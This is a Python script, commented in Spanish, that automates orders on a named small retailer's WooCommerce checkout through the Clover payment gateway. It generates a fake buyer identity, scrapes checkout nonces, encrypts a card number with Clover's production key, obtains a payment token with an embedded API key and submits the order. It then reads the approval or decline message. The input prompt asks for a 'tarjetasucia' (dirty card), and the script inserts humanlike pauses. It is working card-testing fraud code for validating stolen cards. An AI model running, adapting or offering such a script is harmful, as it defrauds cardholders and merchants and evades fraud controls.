from datetime import datetime, timedelta
import time
import random

import faker
import requests
import json
import re

Fake = faker.Faker()

nombre = Fake.first_name()
apellido = Fake.last_name()
correo = random.choice([f"{nombre.lower()}{apellido.lower()}@gmail.com", f"{nombre.lower()}.{apellido.lower()}@yahoo.com", f"{nombre.lower()}_{apellido.lower()}@outlook.com"])
numerotel = f"1{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
addresss = Fake.street_address()
city = Fake.city()
state = Fake.state()
postalcodes = Fake.postcode()

address = addresss
postalcode = postalcodes
session = requests.Session()




def generar_clover_card_payload(numero, exp_month, exp_year, card_brand, fake_address, fake_zip):

    """
    Genera dinámicamente el diccionario 'clover-card' combinando 
    los datos de la tarjeta con la dirección aleatoria de Faker.
    """
    # 1. Limpiar el número de tarjeta por si acaso
    clean_num = str(numero).replace(" ", "").replace("-", "")
    
    # 2. Formatear mes a un solo dígito (Ej: "05" -> "5", "12" -> "12")
    formatted_month = str(int(exp_month))
    
    # 3. Formatear año a 4 dígitos (Ej: "27" -> "2027", "2029" -> "2029")
    formatted_year = str(exp_year)
    if len(formatted_year) == 2:
        formatted_year = "20" + formatted_year
        
    # 4. Auto-detectar Brand si no se envía o asegurar mayúsculas
    brand_upper = str(card_brand).upper()
    if clean_num.startswith('4'):
        brand_upper = "VISA"
    elif clean_num.startswith('5'):
        brand_upper = "MC"
    # Puedes agregar '3' para AMEX, '6' para DISCOVER si lo necesitas

    # 5. Construir la plantilla exacta
    payload = {
        "exp_month": formatted_month,
        "exp_year": formatted_year,
        "first6": clean_num[:6],
        "last4": clean_num[-4:],
        "brand": brand_upper,
        "address_line1": fake_address,
        "address_zip": fake_zip
    }
    print(f"Generated Clover Card Payload: {json.dumps(payload, indent=2)}")
    return payload



def obtener_cookies_sesion():
    """
    Obtiene las cookies generadas en la sesión requests actual.
    Retorna un diccionario con nombre y valor de cada cookie.
    """
    cookies_dict = {}
    for cookie in session.cookies:
        cookies_dict[cookie.name] = cookie.value
    
    if cookies_dict:
        print(f"\n✅ {len(cookies_dict)} cookies extraídas de la sesión:")
        for name, value in cookies_dict.items():
            print(f"   - {name}: {value[:50]}{'...' if len(value) > 50 else ''}")
    else:
        print("\n⚠️ No hay cookies en la sesión")
    
    return cookies_dict


def get_checkout_nonces():
    url = "https://jbarmeats.com/checkout/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
    }
    
    try:
        response = session.get(url, headers=headers)
        print(f"Checkout Page Status Code: {response.status_code}")
        
        if response.status_code != 200:
            print(f"❌ Error al cargar página de checkout: {response.status_code}")
            return None
            
        print("\n✅ Página de checkout cargada correctamente")
        print("Extrayendo nonces dinámicos...")
        
        html = response.text
        nonces = {}
        
        # 1. Buscar woocommerce-process-checkout-nonce en input HTML
        # Nota: Añadí flexibilidad en el orden de name y value por si el HTML cambia
        match1 = re.search(r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"', html)
        if match1:
            nonces['woocommerce-process-checkout-nonce'] = match1.group(1) # <- .group(1) extrae el texto exacto
            print(f"✅ woocommerce-process-checkout-nonce: {nonces['woocommerce-process-checkout-nonce']}")
        else:
            print("❌ No se encontró woocommerce-process-checkout-nonce")
        
        # 2. Buscar woocci_checkout_nonce en el script JavaScript
        match2 = re.search(r'"checkout_nonce"\s*:\s*"([^"]+)"', html)
        if match2:
            nonces['woocci_checkout_nonce'] = match2.group(1) # <- .group(1) extrae el texto exacto
            print(f"✅ woocci_checkout_nonce: {nonces['woocci_checkout_nonce']}")
        else:
            print("❌ No se encontró woocci_checkout_nonce en script")
            
        return nonces

    except Exception as e:
        print(f"❌ Ocurrió un error durante la petición: {e}")
        return None



def add_to_cart(product=None):
    url = "https://jbarmeats.com/?wc-ajax=add_to_cart"

    productos = [
        {
            "google_product_id": "",
            "product_name": "Cheddar German Sausage",
            "product_price": "9.99",
            "success_message": "Cheddar German Sausage has been added to your cart",
            "product_sku": "",
            "product_id": "85",
            "quantity": "1"
        },
        {
            "google_product_id": "",
            "product_name": "Jalapeno German Sausage",
            "product_price": "9.99",
            "success_message": "Jalapeno German Sausage has been added to your cart",
            "product_sku": "",
            "product_id": "86",
            "quantity": "1"
        },
        {
            "google_product_id": "",
            "product_name": "Original Summer Sauage",
            "product_price": "9.99",
            "success_message": "Original Summer Sauage has been added to your cart",
            "product_sku": "",
            "product_id": "3531",
            "quantity": "1"
        },
        {
            "google_product_id": "",
            "product_name": "Cured Pork Tenderloin",
            "product_price": "20.00",
            "success_message": "Cured Pork Tenderloin has been added to your cart",
            "product_sku": "",
            "product_id": "3536",
            "quantity": "1"
        },
        {
            "google_product_id": "",
            "product_name": "Pulled Pork",
            "product_price": "16.00",
            "success_message": "Pulled Pork has been added to your cart",
            "product_sku": "",
            "product_id": "3542",
            "quantity": "1"
        }
    ]

    if product is None:
        payload = random.choice(productos)
    else:
        payload = product
        if payload not in productos:
            print("⚠️ Producto no válido, usando producto aleatorio")
            payload = random.choice(productos)

    print(f"✅ Seleccionando producto: {payload['product_name']} (ID {payload['product_id']})")

    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
    }
    response = session.post(url, data=payload, headers=headers)
    print(f"Status Code: {response.status_code}\n")


def checkcart(save_path=None):
    url = "https://jbarmeats.com/cart/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"
    }
    response = session.get(url, headers=headers)
    print(f"Status Code: {response.status_code}\n")

    html = response.text
    has_product = "product-name" in html
    is_empty = "cart-empty woocommerce-info" in html

    if has_product:
        print("✅ El carrito contiene al menos un producto (clase 'product-name' encontrada).")
    if is_empty:
        print("⚠️ El carrito está vacío (clase 'cart-empty woocommerce-info' encontrada).")
    if not has_product and not is_empty:
        print("ℹ️ No se detectó ninguna de las clases esperadas en el HTML del carrito.")

    if save_path:
        with open(save_path, "w", encoding="utf-8") as f:
            f.write(html)
        print(f"Guardado HTML de carrito en: {save_path}")

    return {
        "html": html,
        "has_product": has_product,
        "is_empty": is_empty,
    }


def postttoken(payload=None, pan=None, numero_tarjeta=None, month=None, year=None, brand=None, cvv=None):
    url = "https://token.clover.com/v1/tokens"
    headers = {
        "accept": "*/*",
        "accept-language": "es-US,es;q=0.9",
        "apikey": "cba01efdb885975004d5bc80cadda6e0",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://checkout.clover.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://checkout.clover.com/",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        "x-clover-client-type": "HOSTED_IFRAME",
    }

    if payload is None:
        payload = {
            "card": {
                "address_line1": address,
                "address_zip": postalcode,
                "brand": brand,
                "cvv": cvv,
                "encrypted_pan": pan,
                "exp_month": month,
                "exp_year": year,
                "first6": numero_tarjeta[:6],
                "last4": numero_tarjeta[-4:],

            }
        }

    response = session.post(url, json=payload, headers=headers)
    print(f"Status Code: {response.status_code}\n")
    print("Clover token obtenido:")
    try:
        res_json = response.json()
    except ValueError:
        print("❌ Respuesta no JSON de Clover token:")
        print(response.text)
        return {"error": response.text, "status_code": response.status_code}

    print(json.dumps(res_json, indent=2))
    if response.status_code != 200:
        print(f"❌ Error HTTP {response.status_code} al obtener token Clover")
        return {"error": res_json, "status_code": response.status_code}

    print("\n✅ Token obtenido correctamente de Clover")
    token_id = res_json.get("id")
    card_data = res_json.get("card") 

    print(f"\n✅ Token ID: {token_id}")
    print(f"✅ Card Data: {json.dumps(card_data, indent=2)}")
    return token_id, card_data # <-- Retornamos ambos valores

import base64
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import load_pem_public_key

def encrypt_clover_pan(pan: str, public_key_pem: str) -> str:
    """
    Cifra el número de tarjeta (PAN) añadiendo el prefijo de 8 ceros 
    requerido por TransArmor y simulando el esquema del navegador.
    """
    # 1. Limpiar espacios o guiones del número de la tarjeta
    clean_pan = str(pan).replace(" ", "").replace("-", "")
    
    # 2. REVELACIÓN: Concatenar los 8 ceros obligatorios antes del PAN
    prefixed_pan = "00000000" + clean_pan
    
    # 3. Convertir la cadena final a bytes
    pan_bytes = prefixed_pan.encode('utf-8')
    
    # 4. Cargar la clave pública de producción
    public_key = load_pem_public_key(public_key_pem.encode('utf-8'))
    
    # 5. Cifrar usando RSA-OAEP con SHA-1 (estándar de interoperabilidad)
    encrypted_bytes = public_key.encrypt(
        pan_bytes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA1()),
            algorithm=hashes.SHA1(),
            label=None
        )
    )
    
    # 6. Codificar a Base64 string limpio
    encrypted_pan_base64 = base64.b64encode(encrypted_bytes).decode('utf-8')
    print()
    return encrypted_pan_base64


tiempo_simulado = datetime.now() - timedelta(minutes=random.randint(2, 5))
session_start_str = tiempo_simulado.strftime("%Y-%m-%d %H:%M:%S")


def checkout( token_id=None, clover_card_data=None, nonce1=None, nonce2=None):
    url = "https://jbarmeats.com/?wc-ajax=checkout"
    
    # Usar nonces dinámicos si están disponible
    
    data = {
        "wc_order_attribution_source_type": "typein",
        "wc_order_attribution_referrer": "(none)",
        "wc_order_attribution_utm_campaign": "(none)",
        "wc_order_attribution_utm_source": "(direct)",
        "wc_order_attribution_utm_medium": "(none)",
        "wc_order_attribution_utm_content": "(none)",
        "wc_order_attribution_utm_id": "(none)",
        "wc_order_attribution_utm_term": "(none)",
        "wc_order_attribution_utm_source_platform": "(none)",
        "wc_order_attribution_utm_creative_format": "(none)",
        "wc_order_attribution_utm_marketing_tactic": "(none)",
        "wc_order_attribution_session_entry": "https://jbarmeats.com/",
        "wc_order_attribution_session_start_time": session_start_str,
        "wc_order_attribution_session_pages": str(random.randint(3, 6)),
        "wc_order_attribution_session_count": "1",
        "wc_order_attribution_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        "billing_first_name": nombre,
        "billing_email": correo,
        "billing_last_name": apellido,
        "billing_company": "",
        "billing_country": "US",
        "billing_address_1": address,
        "billing_address_2": "",
        "billing_city": city,
        "billing_state": state,
        "billing_postcode": postalcode,
        "billing_phone": numerotel,
        "is_gift": "No",
        "is_gift_text": "",
        "shipping_first_name": "",
        "shipping_last_name": "",
        "shipping_company": "",
        "shipping_country": "US",
        "shipping_address_1": "",
        "shipping_address_2": "",
        "shipping_city": "",
        "shipping_state": state,
        "shipping_postcode": "",
        "order_comments": "",
        "shipping_method[0]": "local_pickup:1",
        "payment_method": "woocci_zaytech",
        "terms": "on",
        "terms-field": "1",
        "woocommerce-process-checkout-nonce": nonce1,
        "_wp_http_referer": "/?wc-ajax=update_order_review",
        "woocci_checkout_nonce": nonce2,
        "clover-source": token_id,
        "clover-card": json.dumps(clover_card_data)
        
    }
    
    # Headers que coinciden con el HAR, pero sin br/zstd para evitar respuestas comprimidas no decodificables.
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-encoding": "gzip, deflate",
        "accept-language": "es-US,es;q=0.9",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://jbarmeats.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://jbarmeats.com/checkout/",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest"
    }
    
    response = session.post(url, data=data, headers=headers)
    print(f"Checkout Status Code: {response.status_code}\n")
    try:
        res_json = response.json()
        raw_message = res_json.get("messages", "")
        
        if raw_message:
            # Expresión regular para extraer lo que está dentro de los tags <li> y </li>
            # re.sub elimina espacios en blanco extras, tabulaciones (\t) y saltos de línea (\n)
            match = re.search(r'<li>\s*(.*?)\s*<\/li>', raw_message, re.DOTALL)
            if match:
                error_limpio = match.group(1).strip()
                # Limpiamos posibles tabulaciones internas que devuelve WooCommerce
                error_limpio = re.sub(r'\s+', ' ', error_limpio)
                print(f" Resultado del Checkout: {error_limpio}")
                return error_limpio
            else:
                print(f"❌ Resultado del Checkout (HTML Completo): {raw_message.strip()}")
                return raw_message
        else:
            print("ℹ️ WooCommerce no devolvió ningún mensaje de error.")
            return "No message provided"
            
    except ValueError:
        print("Response (first 500 chars):")
        print(response.text[:500])
        return response.text


def parse_clover_input(card_string):
    cleaned = card_string.strip()
    parts = re.split(r'[|/]', cleaned)
    if len(parts) != 4:
        raise ValueError("Formato inválido. Use cc|mm|aa|cvv")
    numero_tarjeta = parts[0].strip()
    month = parts[1].strip().zfill(2)
    year = parts[2].strip()
    cvv = parts[3].strip()
    if len(year) == 2:
        year = "20" + year
    if numero_tarjeta.startswith("4"):
        brand = "VISA"
    elif numero_tarjeta.startswith("5"):
        brand = "MC"
    elif numero_tarjeta.startswith("3"):
        brand = "AMEX"
    elif numero_tarjeta.startswith("6"):
        brand = "DISCOVER"
    else:
        brand = "DESCONOCIDA"
    return numero_tarjeta, month, year, cvv, brand


def run_clover_checkout(card_string):
    numero_tarjeta, month, year, cvv, brand = parse_clover_input(card_string)
    responsea = session.get("https://api.ipify.org?format=json", timeout=10)
    print(responsea.json())
    add_to_cart()

    time.sleep(random.uniform(1.5, 3.5))
    checkcart()

    nonces = get_checkout_nonces()
    if not nonces:
        raise RuntimeError("No se pudieron obtener los nonces de checkout.")

    nonce1 = nonces.get('woocommerce-process-checkout-nonce')
    nonce2 = nonces.get('woocci_checkout_nonce')
    if not nonce1 or not nonce2:
        raise RuntimeError("No se pudieron extraer los nonces de Clover.")

    pan = encrypt_clover_pan(numero_tarjeta, CLOVER_PROD_PUBLIC_KEY)
    resultado_token = postttoken(pan=pan, numero_tarjeta=numero_tarjeta, month=month, year=year, brand=brand, cvv=cvv)
    if isinstance(resultado_token, tuple):
        tokenid = resultado_token[0]
    elif isinstance(resultado_token, dict) and resultado_token.get("error"):
        raise RuntimeError(f"No se obtuvo token de Clover: {resultado_token.get('error')}")
    else:
        tokenid = resultado_token

    if not tokenid:
        raise RuntimeError("No se obtuvo token de Clover.")

    clover_card_dinamico = generar_clover_card_payload(
        numero=numero_tarjeta,
        exp_month=month,
        exp_year=year,
        card_brand=brand,
        fake_address=address,
        fake_zip=postalcode
    )

    response = checkout(token_id=tokenid, clover_card_data=clover_card_dinamico, nonce1=nonce1, nonce2=nonce2)
    return response


CLOVER_PROD_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArxHJAejXwDpyWwjsMzL7
D1WJ/rDCaiqvsiiHZA+8nnVHVD65oWB9HH1O+ONuhhSblWBNKB0YWeA47cS0JisT
izZAvXHfRNC2Sp9ZnSQvtA67GKPZsTsvOS2AlrExvYHc7ibwVVvLoz/ByJV/N7w5
lBABmu57aFuIa4GEWPfb677dqnv695D1qlbJwTI+BjPk/OPHXuudYG1bi1uE7goq
StX/fL6D0joXnzzMzs2ZdUKMAV/zC/kaILlAe5qA1q3aQQfd8h+gkYCskjfOrp38
abNCe/DFXceq9qQ3R5YkviCxQAZJBZYzD1FjtTsOG7xIV4uoQLJjHzsJaQLkDdrw
YwIDAQAB
-----END PUBLIC KEY-----"""

if __name__ == '__main__':
    tarjetasucia = input("Ingresa el num de tarejta, fecha, año y cvv divididos por | o / (Ej: 4549240645470610|01|32|569): ")
    try:
        numero_tarjeta, month, year, cvv = re.split(r'[|/]', tarjetasucia)
        numero_tarjeta = numero_tarjeta.strip()
        if numero_tarjeta.startswith("4"):
            brand = "VISA"
        elif numero_tarjeta.startswith("5"):
            brand = "MC"
        elif numero_tarjeta.startswith("3"):
            brand = "AMEX"
        elif numero_tarjeta.startswith("6"):
            brand = "DISCOVER"
        else:
            print("marca invalida")
            brand = "DESCONOCIDA"

        month = month.strip()
        if len(year) == 2:
            year = "20" + year

        year = year.strip()
        cvv = cvv.strip()
        print(numero_tarjeta)
        print(month)
        print(year)
        print(cvv)
        print(brand)
    except Exception as e:
        print(f"❌ Error al procesar la entrada de tarjeta: {e}")
        exit(1)

    # Flujo de compra
    print("\n" + "="*60)
    print("INICIANDO FLUJO DE COMPRA...")
    print("="*60)
    responsea = session.get("https://api.ipify.org?format=json", timeout=10)
    print(responsea.json())

    # 1. Agregar al carrito
    add_to_cart()
    time.sleep(random.uniform(1.5, 3.5)) # Pausa humana para mirar el producto

    print("\n✅ Producto agregado al carrito")

    # 2. Verificar carrito
    checkcart()
    time.sleep(random.uniform(2.0, 4.0)) # Pausa humana mientras carga el checkout

    print("\n✅ Carrito verificado")

    # 3. Obtener página de checkout y extraer nonces
    nonces = get_checkout_nonces()
    nonce1 = nonces.get('woocommerce-process-checkout-nonce')
    nonce2 = nonces.get('woocci_checkout_nonce')
    print(f"\n✅ Nonces extraídos: woocommerce-process-checkout-nonce={nonce1}, woocci_checkout_nonce={nonce2}")
    print("\n✅ Página de checkout obtenida y nonces extraídos")

    # 4. Cifrar el número de tarjeta con el esquema de Clover
    pan = encrypt_clover_pan(numero_tarjeta, CLOVER_PROD_PUBLIC_KEY)
    print("\n✅ Número de tarjeta cifrado para Clover")

    resultado_token = postttoken(pan=pan, numero_tarjeta=numero_tarjeta, month=month, year=year, brand=brand, cvv=cvv)
    print("\n✅ Token de Clover obtenido")

    if isinstance(resultado_token, tuple):
        tokenid = resultado_token[0]
    else:
        tokenid = resultado_token

    print(f"Token ID: {tokenid}")

    obtener_cookies_sesion()
    print("\n✅ Cookies de sesión obtenidas")

    clover_card_dinamico = generar_clover_card_payload(
        numero=numero_tarjeta, 
        exp_month=month, 
        exp_year=year, 
        card_brand=brand, 
        fake_address=address, 
        fake_zip=postalcode)

    print(json.dumps(clover_card_dinamico))
    #7. Realizar checkout con token de Clover y nonces dinámicos
    checkout(token_id=tokenid, clover_card_data=clover_card_dinamico, nonce1=nonce1, nonce2=nonce2)
    print("\n✅ Checkout realizado con token de Clover y nonces dinámicos")









